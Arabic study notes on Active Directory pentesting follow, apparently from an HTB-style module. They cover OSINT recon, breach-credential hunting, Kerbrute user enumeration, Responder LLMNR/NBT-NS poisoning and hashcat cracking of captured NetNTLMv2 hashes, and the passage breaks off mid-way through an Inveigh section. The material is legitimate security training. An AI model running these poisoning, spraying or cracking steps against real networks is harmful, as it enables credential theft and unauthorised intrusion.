وده بالضبط هو السيناريو اللي هتمشي عليه طوال الموديول. كل أداة وهجوم هتتعلمه بعد كده هيكون هدفه تنفيذ واحدة من المراحل دي لحد ما تنهي الـ Assessment بالكامل.


----
# Layer 4
## External Recon and Enumeration Principles

أول كلمة هنا:

## External

يعني **من بره الشركة**.

لسه مخدتش Access.

لسه معندكش User.

لسه مدخلتش الشبكة.

---

## Recon

Recon اختصار

**Reconnaissance**

يعني

> استطلاع أو استكشاف.

زي الجيش قبل الحرب.

قبل ما يدخل المعركة.

يبعت ناس تشوف:

- في كام جندي؟
- فين الأسلحة؟
- فين المداخل؟

إحنا بنعمل نفس الكلام.

---

## Enumeration

دي خطوة بعد الـ Recon.

الـ Recon بيقول

> أعرف إن فيه سيرفر.

الـ Enumeration يقول

> طب السيرفر ده عليه إيه؟  
> مين اليوزرز؟  
> إيه الخدمات؟

يعني Enumeration = جمع معلومات بالتفصيل.

---

## Before kicking off any pentest...

بيقول

قبل ما تبدأ أي Penetration Test...

اعمل External Recon.

---

## ليه؟

الموديول قال 3 أسباب.

---

## 1) Validate Information

يعني

**تتأكد إن المعلومات اللي العميل اداهالك صح.**

مثلاً

العميل قالك

```
Domain:
company.local
```

أنت تتأكد.

---

أو قال

```
Website

company.com
```

تتأكد.

---

ليه؟

لأن أوقات العميل نفسه بيبقى ناسي.

أو فيه Subdomain جديد.

---

## 2) Ensure Scope

دي مهمة جدًا.

يعني

تتأكد إنك مش بتهاجم حاجة برا الـ Scope.

---

مثلاً

الشركة مستضافة على AWS.

وعلى نفس السيرفر

شركة تانية.

---

لو عملت Scan غلط.

ممكن تضرب الشركة التانية.

وده Illegal.

---

عشان كده لازم تعرف

مين بتاع العميل

ومين مش بتاعه.

---

## 3) Looking for Public Information

يعني

تشوف

هل فيه معلومات موجودة على الإنترنت؟

---

زي

Passwords

Emails

Documents

GitHub

Leaks

Credentials

---

كل دي ممكن تساعدك.

---

## Lay of the Land

الجملة دي معناها

> افهم البيئة الأول.

زي واحد رايح بلد جديدة.

أول حاجة

يبص على الخريطة.

---

إحنا بنعمل نفس الكلام.

---

## Information Leaks

يعني

تسريب معلومات.

---

مثلاً

موظف رفع

```
config.php
```

على GitHub.

---

جواه

Password.

---

أو

رفع PDF.

---

الميتاداتا فيها

```
Username

Mohab.Nasser
```

---

كل ده Information Leak.

---

## Username Format

دي نقطة مهمة جدًا.

---

الشركات كلها عندها Naming Convention.

مثلاً

```
Mohab Nasser
```

يبقى

```
mohab.nasser
```

أو

```
mnasser
```

أو

```
mn
```

---

لو عرفتها.

هتعرف تعمل Password Spray.

---

## GitHub

ليه بندور فيه؟

---

لأن Developers أوقات يرفعوا

```
Password

API Key

Token

AWS Secret
```

بالغلط.

---

وده بيبقى Jackpot.

---

## Intranet

يعني

الموقع الداخلي للشركة.

---

مثلاً

```
intranet.company.local
```

---

مش بيظهر للعامة.

لكن ممكن PDF يكون فيه Link ليه.

---

## Enterprise Environment

يعني

بيئة الشركة.

---

يعني

إيه السيرفرات؟

إيه البرامج؟

إيه الدومين؟

إيه الأمن؟

---

## What Are We Looking For?

هنا بيقولك

إحنا بندور على إيه؟

---

## أول حاجة

## IP Space

يعني

كل الـ IPs

بتاعة الشركة.

---

زي

```
192.168.x.x

172.16.x.x

10.x.x.x
```

أو Public IP.

---

## ASN

يعني

Autonomous System Number.

---

كل شركة كبيرة

بيبقى ليها رقم على الإنترنت.

---

زي

Google

Amazon

Microsoft

---

لو الشركة صغيرة

غالبًا

هتبقى مستضافة على AWS.

---

## Netblocks

يعني

رينجات الـ IP.

---

مثلاً

```
134.209.24.0/24
```

---

يعني

كل الـ IPs

دي تبع الشركة.

---

## Cloud Presence

يعني

الشركة على

AWS؟

Azure؟

Google Cloud؟

DigitalOcean؟

---

وده مهم جدًا.

---

## Hosting Provider

يعني

مين مستضيف الموقع.

---

مثلاً

Cloudflare.

---

AWS.

---

Azure.

---

## DNS Records

كل البيانات

بتاعة الدومين.

---

زي

A Record

MX

TXT

NS

CNAME

---

#0# Domain Information

يعني

كل المعلومات

عن الدومين.

---

مين مالكه؟

---

مين بيديره؟

---

هل فيه

Subdomains؟

---

زي

```
vpn.company.com

mail.company.com

dev.company.com
```

---

## Public Services

يعني

الخدمات المفتوحة للعالم.

---

زي

Mail

VPN

Website

OWA

DNS

---

## Defenses

يعني

الشركة بتستخدم

إيه للحماية؟

---

SIEM

يعني

Security Monitoring.

---

AV

Antivirus.

---

IPS

Intrusion Prevention.

---

IDS

Intrusion Detection.

---

## Schema Format

دي من أهم الحاجات.

---

يعني

شكل اليوزر.

---

مثلاً

```
first.last
```

---

أو

```
flast
```

---

أو

```
firstl
```

---

لو عرفته.

هتعرف تولد آلاف اليوزرز.

---

## Password Policy

يعني

الشركة بتحط Password إزاي.

---

مثلاً

لازم

8 Characters.

---

Special Character.

---

Expiry.

---

History.

---

## Data Disclosures

يعني

ملفات الشركة المنشورة.

---

زي

PDF

DOCX

PPTX

XLSX

---

ليه؟

---

لأنها ممكن تحتوي

Metadata.

---

مثلاً

Author

Mohab.Nasser

---

أو

Link

```
https://sharepoint.company.local
```

---

أو

File Share.

---

## Breach Data

يعني

الشركة

اتسربت قبل كده؟

---

لو آه.

---

يمكن

Passwords

لسه شغالة.

---

## Where Are We Looking?

يعني

هندور فين؟

---

## ASN Registrars

زي

IANA

ARIN

RIPE

---

ودي تعرفك

مين مالك الـ IP.

---

## Domain Registrars

زي

ICANN

DomainTools

---

يعرفوك

مين مالك الدومين.

---

## Social Media

ليه؟

---

من LinkedIn

أعرف

Employees.

---

من Twitter

أعرف

Projects.

---

من Facebook

أعرف

Offices.

---

## Job Posts

دي كنز.

---

مثلاً

الشركة منزلة

Job

بيقول

```
SharePoint 2013
```

---

يبقى

لسه عندهم

SharePoint 2013.

---

وده قديم.

---

يبقى

أبدأ أدور

على ثغراته.

---

أو

بيقول

```
VMware Horizon
```

---

عرفت

بيستخدموا VMware.

---

أو

```
Fortinet
```

---

عرفت

نوع الفايروول.

---

## Company Website

الموقع الرسمي.

---

هنجيب منه

Emails

Phones

PDFs

Contacts

News

---

## Cloud Storage

زي

AWS S3

Azure Blob

GitHub

---

أوقات

يبقى Public بالغلط.

---

## Google Dorks

دي Search Queries

ذكية.

---

مثلاً

```
site:company.com filetype:pdf
```

---

أو

```
site:company.com ext:xlsx
```

---

أو

```
intext:"password"
```

---

كل دي

Google Dorks.

---

## Breach Sources

زي

HaveIBeenPwned.

---

ودي تقولك

الإيميل ده

اتسرب؟

---

## DeHashed

دي أقوى.

---

بتجيب

Email

Password

Hash

Database.

---

مثلاً

```
Mohab

↓

Password123
```

---

يمكن

لسه بيستخدمه.

---

## Finding Address Spaces

الموديول استخدم

Hurricane Electric

BGP Toolkit.

---

دي تعرف منها

الـ IPs.

---

## ليه مهم؟

---

علشان تعرف

إيه

بتاع العميل.

---

## Smaller Companies

الشركات الصغيرة

غالبًا

على AWS.

---

مش عندها

ASN.

---

## Scope

لو لقيت

IP

على AWS.

---

متهاجموش

إلا لو العميل قال.

---

## Third Party

يعني

شركة تانية.

---

ممكن تحتاج

Approval.

---

مثلاً

Oracle.

---

AWS.

---

Azure.

---

## DNS

الموديول بيقول

DNS

كنز.

---

ليه؟

---

ممكن تلاقي

Subdomains.

---

Mail.

---

VPN.

---

Internal Hostnames.

---

## Example

لقى

```
mail1.inlanefreight.com
```

---

يبقى فيه

Mail Server.

---

لقى

```
ns1
```

---

يبقى

DNS Server.

---

## nslookup

الأمر

```
nslookup ns1.domain.com
```

---

يسألك

الـ DNS.

---

ويرجع

الـ IP.

---

وده عمله

ولقى

IP جديد.

---

لكن

قال

متهجموش.

---

تأكد الأول

إنه

In Scope.

---

## Public Data

زي

LinkedIn.

---

Job Posts.

---

Facebook.

---

GitHub.

---

كلهم

OSINT.

---

## SharePoint Example

لقي

إعلان وظيفة.

---

بيطلب

SharePoint 2013.

---

يبقى

الشركة

لسه عندها

SharePoint.

---

وده

بيفيدنا.

---

## PDF Hunting

عمل

Google Dork

```
filetype:pdf inurl:inlanefreight.com
```

---

يعني

هات كل PDF.

---

ليه؟

---

الميتاداتا.

---

اللينكات.

---

الـ Author.

---

الـ Software.

---

كلها معلومات.

---

## نصيحة مهمة جدًا

الموديول قال:

أول ما تلاقي

أي ملف

نزله.

---

ليه؟

---

يمكن

يتحذف.

---

أو

تنسى مكانه.

---

احتفظ بكل الأدلة.

---

## Email Hunting

عمل

```
intext:"@inlanefreight.com"
```

---

طلعله

الإيميلات.

---

عرف

Naming Convention.

---

طلع

```
Emma.Williams

John.Smith

David.Jones
```

---

يبقى

الشركة

بتستخدم

first.last.

---

## Username Harvesting

يعني

تجمع Usernames.

---

من LinkedIn.

---

بأداة

linkedin2username.

---

وتطلع

```
first.last

flast

f.last

firstl
```

---

## Credential Hunting

باستخدام

DeHashed.

---

لقى

```
Roger

↓

Ilovefishing!
```

---

ولقى

```
Jane

↓

Starlight1982_!
```

---

هل لازم يشتغلوا؟

لا.

---

لكن

نجرب.

---

يمكن

اليوزر

لسه بيستخدم

نفس الباسورد.

---

## ليه كل ده مهم؟

المؤلف بيقول عن تجربة:

أوقات كنت مش عارف أدخل الشركة نهائي.

---

رجعت

لـ

Google

LinkedIn

GitHub

DeHashed

---

عملت Password Spray.

---

دخلت.

---

وده فعلاً بيحصل كتير.

---

## أهم جملة في الصفحة كلها

> **بمجرد ما تجيب Credentials حتى لو Domain User عادي، تقدر تعمل معظم عمليات الـ Active Directory Enumeration، بل وكمان تنفذ عدد كبير من الهجمات.**

يعني **أصعب مرحلة غالبًا هي إنك تجيب أول User**. بعد كده، الـ Active Directory بيفتحلك أبواب كتير جدًا: تقدر تجمع معلومات أكتر، تدور على Misconfigurations، وتبدأ تتحرك داخل الشبكة لحد ما توصل لهدفك.

---

## الخلاصة العملية (احفظ التسلسل ده)

أي Pentester محترف بيبدأ بالشكل ده:

1. **راجع الـ Scope** → أعرف المسموح والممنوع.
2. **اعمل Passive OSINT** → Google Dorks، LinkedIn، GitHub، DNS، WHOIS، BGP.
3. **اجمع Emails وUsernames** → اعرف Naming Convention.
4. **دور على ملفات ووثائق** → PDF، DOCX، PPTX، Metadata.
5. **ابحث عن Breach Data** → HaveIBeenPwned، DeHashed.
6. **استنتج معلومات مفيدة** → أنواع السيرفرات، البرامج، الخدمات، وسائل الحماية.
7. **كوّن Wordlists** → أسماء مستخدمين وكلمات مرور محتملة.
8. **بعد كده فقط** تبدأ الـ **Active Enumeration** والهجمات المسموح بيها داخل الـ Scope.


# Layer 5
---

## أولًا: إحنا بنعمل إيه أصلًا؟

إنت داخل تعمل **Internal Penetration Test** على شركة اسمها:

> **Inlanefreight**

يعني الشركة سمحتلك تدخل جوه الشبكة الداخلية بتاعتها وتشوف لو فيه ثغرات.

الهدف مش إنك تخترق وخلاص.

الهدف إنك تعرف:

- الأجهزة الموجودة
    
- السيرفرات
    
- الـ Domain Controller
    
- المستخدمين
    
- الخدمات
    
- الثغرات
    
- إزاي تقدر تاخد أول Access
    

وده اسمه:

> Initial Enumeration

يعني أول مرحلة فى اختبار الاختراق.

---

## Setting Up

الجزء ده بيقول العميل ممكن يديلك البيئة بأكتر من شكل.

زى مثلًا:

---

## 1) Linux VM

يعنى يديلك VM جاهز جوه الشبكة.

زى Kali أو Parrot.

إنت هتدخل عليه SSH.

---

## 2) جهاز حقيقى

يحط جهاز صغير فى الشركة.

زى Raspberry Pi.

يوصل بالنت ويربط عندك VPN.

---

## 3) تروح الشركة بنفسك

توصل اللاب بتاعك فى سويتش الشركة.

---

## 4) AWS أو Azure VM

يعنى فيه سيرفر فى كلاود لكن داخل على الشبكة الداخلية.

---

## 5) VPN

يديك VPN تدخل بيه.

وده أقل صلاحيات شوية.

لأن فيه حاجات مش هتقدر تعملها زى:

LLMNR Poisoning

---

## 6) جهاز الموظف نفسه

يديك Windows Workstation.

تشتغل منه.

---

## Grey Box ولا Black Box؟

دى أنواع الاختبارات.

---

## Black Box

يعنى متعرفش أى حاجة.

زى الهاكر الحقيقى.

---

## Grey Box

يعطوك شوية معلومات.

زى:

Network Range

أو

IP Range

وده اللى حصل هنا.

---

## العميل إدالك إيه؟

العميل قالك:

عندك:

Linux VM

Windows VM

Network Range

```
172.16.5.0/23
```

وبس.

---

يعنى معرفكش:

- الدومين
    
- أسماء الأجهزة
    
- اليوزرز
    
- السيرفرات
    

كل ده هتكتشفه بنفسك.

---

## المطلوب منك

المطلوب تعمل Enumeration.

يعنى تعرف:

## Hosts

مين موجود؟

---

## Services

كل جهاز فاتح Ports إيه؟

---

## Vulnerabilities

فى ثغرات؟

---

## Users

مين موجود فى الدومين؟

---

## Domain Controller

فين؟

---

## ليه بنبدأ من غير Credentials؟

علشان ده واقعى.

لو هاكر دخل الشركة.

هيكون معاه Username؟

لا.

هيبدأ من الصفر.

---

## الحاجات المهمة اللى لازم تدورها عليها

الكاتب عامل جدول.

---

## AD Users

ليه؟

علشان بعدين تعمل

Password Spraying

---

## AD Joined Computers

زى

Domain Controller

File Server

Exchange

SQL

---

## Key Services

زى

Kerberos

LDAP

DNS

SMB

---

## Vulnerable Hosts

يعنى جهاز قديم.

أو عليه ثغرة.

---

## لازم يبقى عندك Methodology

يعنى متشتغلش عشوائى.

الكاتب بيقول:

لو دخلت Active Directory بدون خطة...

هتتايه.

لأن البيانات ضخمة جدًا.

---

فبيعمل ترتيب.

---

## الأول

Passive Enumeration

---

بعدها

Active Enumeration

---

بعدها

Analyze

---

بعدها

Attack

---

## Passive Enumeration

يعنى تجمع معلومات

بدون ما تكلم الأجهزة.

زى إنك تسمع الترافيك.

---

الأدوات:

Wireshark

tcpdump

Responder

---

## Wireshark

الكاتب قال:

شغل Wireshark.

```
sudo wireshark
```

---

ليه؟

علشان تسمع الشبكة.

---

إيه اللى ظهر؟

ARP

MDNS

---

## يعنى إيه ARP؟

ARP

هو بروتوكول بيقول:

> مين صاحب الـ IP ده؟

لو جهاز بيسأل:

```
مين عنده
172.16.5.25؟
```

يبقى فيه جهاز اسمه

172.16.5.25

موجود.

---

يبقى من غير ما تعمل Scan

عرفت Host موجود.

---

ظهر مثلًا:

```
172.16.5.5
172.16.5.25
172.16.5.50
```

---

## MDNS

ده بروتوكول Local Name Resolution.

يعنى بدل ما يقول:

```
172.16.5.125
```

يقول:

```
ACADEMY-EA-WEB01
```

فأنت كده عرفت:

اسم الجهاز.

---

وده مهم جدًا.

---

## لو مفيش GUI؟

استعمل:

tcpdump

```
sudo tcpdump -i ens224
```

---

وده بيعمل نفس الفكرة.

يسمع الترافيك.

---

## ليه نحفظ PCAP؟

علشان:

ترجعله بعدين.

يمكن تلاقى معلومات فاتتك.

وكمان تحطه فى التقرير.

---

## بعد كده استخدم Responder

Responder مشهور جدًا.

لكن هنا

مش بنعمل Poisoning.

---

احنا بنستخدم

Analyze Mode

```
sudo responder -I ens224 -A
```

لاحظ:

```
-A
```

يعنى

Analyze فقط.

---

يعنى:

يسمع.

لكن ميبعتش Responses.

---

وده آمن.

---

Responder اكتشف Hosts جديدة.

يبقى عمل Target List أكبر.

---

## بعد Passive

نبدأ Active

---

## باستخدام fping

```
fping -asgq 172.16.5.0/23
```

تعالى نشرح كل Flag.

---

### -a

اعرض الأجهزة الحية فقط

Alive

---

### -s

اعرض Statistics

---

### -g

Generate Range

يعنى

```
172.16.5.0/23
```

يبقى يعمل Scan لكل الـ Range.

---

### -q

Quiet

ميطبعش كل محاولة.

---

الناتج:

```
172.16.5.5

172.16.5.25

172.16.5.50
```

...

يعنى دول ردوا.

---

بعدها قال:

```
9 alive
```

يبقى فيه

9 أجهزة.

---

## بعد كده

Nmap

---

```
sudo nmap -A -iL hosts.txt
```

---

يعنى إيه؟

---

## -A

Aggressive Scan

وده بيعمل كذا حاجة مرة واحدة.

زى:

OS Detection

Version Detection

Scripts

Traceroute

---

## -iL

يعنى اقرأ الـ IPs

من ملف.

---

## -oN

احفظ النتيجة.

---

## النتيجة

شاف الجهاز:

```
172.16.5.5
```

فاتح Ports كتير.

---

## 53

DNS

---

## 88

Kerberos

---

وجود Kerberos مع LDAP

غالبًا

ده Domain Controller.

---

## 389

LDAP

---

## 636

Secure LDAP

---

## 445

SMB

---

## 3268

Global Catalog

---

## 3389

RDP

---

## 5357

HTTP API

---

## منين عرف إنه Domain Controller؟

بص على:

```
DNS:
ACADEMY-EA-DC01
```

وكمان:

```
LDAP
```

وكمان:

```
Kerberos
```

كلهم موجودين.

يبقى ده DC.

---

## Host تانى

```
172.16.5.100
```

لقى عليه:

IIS

SQL Server

SMB

---

لكن لاحظ:

```
Windows Server 2008
```

وده قديم جدًا.

---

إيه المشكلة؟

أنظمة قديمة.

يبقى ممكن تكون مصابة بثغرات قديمة.

زى:

- EternalBlue
    
- MS08-067
    
- BlueKeep
    

---

لكن الكاتب بيحذر.

متستغلهاش مباشرة.

لازم العميل يوافق.

لأن ممكن السيرفر يقع.

---

## بعد كده

بدأ يدور على Users

---

لأن مفيش Credentials.

---

هيستخدم

Kerbrute.

---

## Kerbrute

دى أداة

بتسأل الـ Domain Controller:

```
هل اليوزر ده موجود؟
```

---

من غير Password.

---

وده اسمه

Username Enumeration

---

الميزة؟

هادئة.

---

ليه؟

لأن

Kerberos Pre-auth Failures

غالبًا

مش بتتسجل فى Logs.

---

يبقى تقدر تجرب آلاف اليوزرز.

---

## حمل الأداة

```
git clone
```

---

بعدها

```
make all
```

---

علشان يبنى نسخة Linux

Windows

Mac

---

بعدها

```
mv
```

يحطها فى

```
/usr/local/bin
```

علشان تشتغل من أى مكان.

---

## الاستخدام

```
kerbrute userenum
```

---

```
-d
```

اسم الدومين

---

```
--dc
```

IP بتاع Domain Controller

---

بعدها

```
jsmith.txt
```

Wordlist

---

طلع:

```
VALID USERNAME
```

```
jjones
```

```
sbrown
```

...

---

فى الآخر قال:

```
56 valid users
```

---

يعنى عرف

56 يوزر حقيقى.

---

ودول هيستخدمهم بعدين فى

Password Spraying.

---

## بعد كده بيتكلم عن SYSTEM

لو قدرت تجيب

```
NT AUTHORITY\SYSTEM
```

على جهاز Join فى الدومين.

يبقى تقريبًا كأن معاك User فى الدومين.

---

ليه؟

لأن الجهاز نفسه عنده

Computer Account

يقدر يكلم Active Directory.

---

## إزاى أوصل لـ SYSTEM؟

أمثلة:

- EternalBlue
    
- BlueKeep
    
- Juicy Potato
    
- PsExec
    
- Local Privilege Escalation
    

---

لو وصلت لـ SYSTEM

تقدر:

- تشغل BloodHound
    
- تعمل Kerberoasting
    
- تعمل ASREPRoasting
    
- تجمع NTLM Hashes
    
- Token Impersonation
    
- ACL Abuse
    

---

## آخر نقطة مهمة جدًا

الكاتب بيحذر:

متستخدمش أى Tool وخلاص.

لازم تعرف:

هل هى:

- هادية؟
    
- بتعمل DoS؟
    
- بتوقع السيرفر؟
    
- بتشغل Exploits؟
    

لأن ممكن توقف Production Server عند العميل.

وده كارثة.

---

## الميثودولوجي الكامل للجزء ده

1. **ابدأ من غير Credentials.**
    
2. **اعمل Passive Enumeration** باستخدام Wireshark أو tcpdump أو Responder (Analyze Mode).
    
3. **اجمع الـ IPs وأسماء الأجهزة** من ARP وMDNS.
    
4. **اعمل Active Discovery** باستخدام `fping` لمعرفة الأجهزة الحية.
    
5. **اعمل Nmap Scan** لمعرفة الـ Ports والخدمات وأنظمة التشغيل.
    
6. **حدد الأجهزة المهمة** مثل Domain Controller وSQL وWeb وFile Servers.
    
7. **ابحث عن الأجهزة القديمة أو الضعيفة** التى قد توفر نقطة دخول.
    
8. **اعمل Username Enumeration** باستخدام Kerbrute للحصول على قائمة مستخدمين صحيحة.
    
9. **وثّق كل حاجة** (IPs، أسماء الأجهزة، الخدمات، النتائج) لأنك هترجع لها فى المراحل التالية.
    
10. **بعد ما يبقى عندك Users أو Foothold** تبدأ مرحلة استغلال الدومين (Password Spraying، LLMNR Poisoning، BloodHound، Kerberoasting... إلخ).

# Layer 6
## LLMNR / NBT-NS Poisoning from Linux

بعد ما خلصنا مرحلة الـ Initial Enumeration وبقينا عارفين شوية معلومات عن الدومين (زي الـ Users، الـ Groups، الأجهزة الموجودة، والـ Domain Controller)، هنبدأ أول خطوة فعلية للحصول على Credentials.

في الجزء ده هنستخدم طريقتين:

- Network Poisoning
- Password Spraying (هيتشرح بعدين)

الهدف الأساسي هو إننا نحصل على Username و Password أو Password Hash لمستخدم داخل الدومين، بحيث يبقى عندنا Foothold (أول نقطة دخول) ونقدر نكمل الـ Enumeration باستخدام Credentials حقيقية.

---

## يعني إيه Foothold؟

الـ Foothold هو أول Access بنحصل عليه داخل الشبكة.

بدل ما نبقى Anonymous ومش معانا أي صلاحيات، يبقى معانا User حقيقي نقدر نستخدمه في باقى الهجوم.

---

## Man In The Middle (MITM)

الهجوم ده يعتبر Man In The Middle Attack.

يعني بدل ما الاتصال يكون:

User → Server

يبقى:

User → Attacker → Server

إنت بتقف في النص وتخدع الضحية بحيث تبعتلك بياناتها بدل السيرفر الحقيقي.

---

## LLMNR & NBT-NS

الاتنين دول بروتوكولات موجودين في Windows.

وظيفتهم تحويل اسم الجهاز إلى IP Address.

يعني شبه DNS، لكن بيستخدموا لما الـ DNS يفشل.

---

## LLMNR

LLMNR اختصار:

Link Local Multicast Name Resolution

معناها:

- Link Local → داخل نفس الشبكة فقط.
- Multicast → الرسالة بتتبعت لكل الأجهزة الموجودة على الشبكة.
- Name Resolution → تحويل اسم الجهاز إلى IP.

بيشتغل على:

UDP Port 5355

---

## NBT-NS

NBT-NS اختصار:

NetBIOS Name Service

وده بروتوكول أقدم من LLMNR.

لو الـ DNS فشل، وبعده LLMNR فشل، الجهاز بيستخدم NBT-NS.

بيشتغل على:

UDP Port 137

---

## ترتيب عملية الـ Name Resolution

غالبًا الجهاز بيعمل الآتي:

1. يسأل DNS.
2. لو فشل يستخدم LLMNR.
3. لو فشل يستخدم NBT-NS.

---

## فين المشكلة؟

المشكلة إن LLMNR و NBT-NS بيسمحوا لأي جهاز على نفس الشبكة إنه يرد.

مش لازم يكون:

- DNS Server
- Domain Controller

أي جهاز يقدر يقول:

"أنا السيرفر اللي إنت بتدور عليه."

وده هو أصل الثغرة.

---

## إيه هو الـ Poisoning؟

الـ Poisoning معناه إنك ترد على طلبات الأجهزة بمعلومات مزيفة.

يعني الضحية تسأل:

"حد يعرف printer01؟"

إنت ترد:

"أيوه أنا printer01."

الضحية هتصدقك وتبدأ تتعامل معاك.

وده اسمه Spoofing أو Impersonation.

---

## Responder

Responder هي أشهر أداة بتستخدم لتنفيذ LLMNR و NBT-NS Poisoning.

هي بتسمع أي Broadcast Request على الشبكة، ولما تلاقي جهاز بيدور على Host مش موجود، ترد بسرعة وتقول إنها هي الجهاز المطلوب.

	وبالتالي الضحية تبدأ تبعت Authentication للـ Attacker.

---

## مثال عملي للهجوم

الموظف كتب:

\\printer01.inlanefreight.local

بدل:

\\print01.inlanefreight.local

DNS حاول يلاقي الجهاز.

ملقهوش.

الجهاز بعت Broadcast لكل الشبكة وقال:

"مين يعرف printer01؟"

Responder رد بسرعة:

"أنا printer01."

الضحية صدقته.

وبعتت Authentication Request.

الـ Attacker استقبل:

- Username
- NetNTLM Hash

---

## إيه اللي بنسرقه؟

إحنا مش بناخد Password مباشرة.

إحنا بناخد:

NetNTLMv1

أو

NetNTLMv2 Hash

بعدها نحاول نكسره Offline.

---

## يعني إيه Hash؟

الـ Hash عبارة عن بصمة مشفرة لكلمة المرور.

مثال:

Password:

Mohab123

يتحول إلى قيمة طويلة جدًا اسمها Hash.

إنت مش بتشوف الباسورد الحقيقي.

لكن ممكن تحاول تكسر الـ Hash باستخدام Wordlists.

---

## Offline Cracking

يعني بعد ما تاخد الـ Hash، متكلمش الضحية تاني.

تاخده عندك على جهازك وتحاول تكسره باستخدام أدوات زى:

- Hashcat
- John The Ripper

ودي ميزة لأنها مبتعملش Traffic إضافي على الشبكة.

---

## SMB Relay

مش لازم كل مرة تكسر الـ Hash.

في بعض الحالات تقدر تستخدم الـ Hash مباشرة علشان تعمل Authentication على جهاز تاني.

وده اسمه:

SMB Relay Attack

وده هيتشرح في Module تاني.

---

## TTPs

TTPs اختصار:

- Tactics
- Techniques
- Procedures

يعني الطريقة اللي المهاجم بينفذ بيها الهجوم.

في الجزء ده الهدف هو جمع:

- NTLMv1 Hashes
- NTLMv2 Hashes

وبعدها محاولة كسرها للحصول على Password الحقيقي.

---

## NTLMv1 vs NTLMv2

NTLMv1

- قديم.
- ضعيف.
- بيتكسر بسهولة.

NTLMv2

- أحدث.
- أكثر أمانًا.
- أصعب وأبطأ في الكسر.

---

## الأدوات المستخدمة

### Responder

أشهر أداة لعمل:

- LLMNR Poisoning
- NBT-NS Poisoning
- MDNS Poisoning

---

### Inveigh

أداة MITM شبيهة بـ Responder.

مكتوبة بـ:

- C#
- PowerShell

وتستخدم غالبًا على Windows.

---

### Metasploit

فيه Modules جاهزة تساعد في Spoofing و Poisoning.

---

## البروتوكولات اللي يقدر Responder يتعامل معاها

- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Authentication

وكمان يدعم:

- MSSQL
- DCE-RPC
- FTP
- POP3
- IMAP
- SMTP

وده بيخليه أداة قوية جدًا في الـ Internal Pentest.

---

## Responder Analysis Mode

في مرحلة الـ Enumeration كنا استخدمنا:

```bash
sudo responder -I ens224 -A
```

الـ `-A` معناها Analyze Mode.

يعني:

- يسمع فقط.
- يعرض Requests.
- لا يرد عليها.
- لا يعمل Poisoning.

كان مجرد مراقب للشبكة.

---

## دلوقتي هنبدأ Poisoning

هنشيل:

```bash
-A
```

ونشغل Responder عادي.

وقتها هيبدأ يرد على الطلبات بنفسه ويخدع الأجهزة.

---

## أهم Flags في Responder

### -I

تحديد الـ Network Interface.

مثال:

```bash
-I ens224
```

---

### -A

Analyze Mode.

يسمع فقط بدون أي رد.

---

### -w

يشغل WPAD Rogue Proxy Server.

وده يساعد في الحصول على Authentication من المتصفحات.

---

### -f

يحاول يعمل Fingerprint للجهاز اللي بعت الطلب.

يعرف نوع الـ Operating System وإصداره.

---

### -v

Verbose Mode.

يعرض تفاصيل أكتر أثناء التشغيل.

---

### -F

يجبر الضحية على Authentication.

قد يظهر Login Prompt.

---

### -P

يجبر الـ Proxy Authentication.

ويستخدم غالبًا مع WPAD.

---

## WPAD

WPAD اختصار:

Web Proxy Auto Discovery

بعض أجهزة Windows والمتصفحات بتحاول تدور تلقائيًا على Proxy داخل الشبكة.

Responder يقدر ينتحل شخصية الـ Proxy.

ولو المستخدم استخدمه، هيبعت Authentication للـ Attacker.

وده بيكون مفيد جدًا داخل الشركات الكبيرة.

---

## لو Responder نجح

هيطبع الـ Hash مباشرة على الشاشة.

وكمان هيحفظه داخل:

```text
/usr/share/responder/logs
```

كل Host هيكون ليه Log مستقل.

مثال:

```text
SMB-NTLMv2-SSP-172.16.5.25.txt
```

وده معناه:

- البروتوكول: SMB
- نوع الـ Hash: NTLMv2
- IP الضحية: 172.16.5.25

---

## تشغيل Responder

أبسط تشغيل للأداة:

```bash
sudo responder -I ens224
```

الأفضل تسيبه شغال في tmux أو Screen أثناء ما تكمل Enumeration.

كل ما جهاز يغلط في Name Resolution هيجيلك Hash جديد.

---

## البورتات المطلوبة

Responder محتاج يقدر يفتح عدة Ports، أهمها:

- UDP 137
- UDP 138
- UDP 53
- UDP 5355
- UDP 5353
- TCP 80
- TCP 135
- TCP 139
- TCP 445
- TCP 389
- TCP 1433
- TCP 21
- TCP 25
- TCP 110
- TCP 587
- TCP 3128

ولو في Service مش محتاجها، تقدر تقفلها من:

Responder.conf

---

## كسر الـ Hash

لو حصلنا على NetNTLMv2 Hash، نستخدم Hashcat.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### شرح الأمر

- `-m 5600` → Hash Mode الخاص بـ NetNTLMv2.
- `hash.txt` → الملف اللي فيه الـ Hash.
- `rockyou.txt` → أشهر Wordlist لتجربة كلمات المرور.

---

## مثال من الملف

الـ Hash الخاص بالمستخدم:

FOREND

اتكسر.

وكلمة المرور كانت:

```text
Klmcargo2
```

وده معناه إن كلمة المرور كانت ضعيفة، وقدر Hashcat يجيبها.

---

## بعد كده؟

بمجرد ما يبقى معانا:

- Username
- Password

يبقى عندنا Foothold داخل الدومين.

ومن هنا نبدأ مرحلة الـ Credentialed Enumeration، ونجمع معلومات أكتر عن الـ Active Directory، أو نتحرك جانبيًا (Lateral Movement)، أو نرفع الصلاحيات لو الحساب يسمح بكده.


# Layer 7
## LLMNR / NBT-NS Poisoning from Windows

في الجزء اللي فات استخدمنا أداة **Responder** على Linux علشان نعمل LLMNR و NBT-NS Poisoning ونلتقط الـ Hashes.

لكن لو جهاز الـ Attacker كان Windows، أو العميل مدينا Windows Machine نشتغل منها، أو قدرنا نوصل لجهاز Windows داخل الشبكة كـ Local Administrator، هنستخدم أداة اسمها **Inveigh** لأنها بتؤدي نفس وظيفة Responder تقريبًا. 

---

## Inveigh

**Inveigh** هي أداة مكتوبة بـ:

- PowerShell
- C#

وظيفتها تنفيذ هجمات:

- LLMNR Poisoning
- NBT-NS Poisoning
- DNS Spoofing

وكمان تقدر تلتقط الـ Authentication Requests وتحفظ الـ NTLM Hashes.

الأداة تقدر تتعامل مع بروتوكولات كتير منها:

- LLMNR
- DNS
- mDNS
- NBNS
- DHCPv6
- ICMPv6
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Authentication

وفي لابات HTB بتكون موجودة داخل:

```text
C:\Tools
```

---

## استخدام نسخة PowerShell

أول حاجة بنعمل Import للـ Module:

```powershell
Import-Module .\Inveigh.ps1
```

بعدها نعرض كل الـ Parameters اللي الأداة بتدعمها:

```powershell
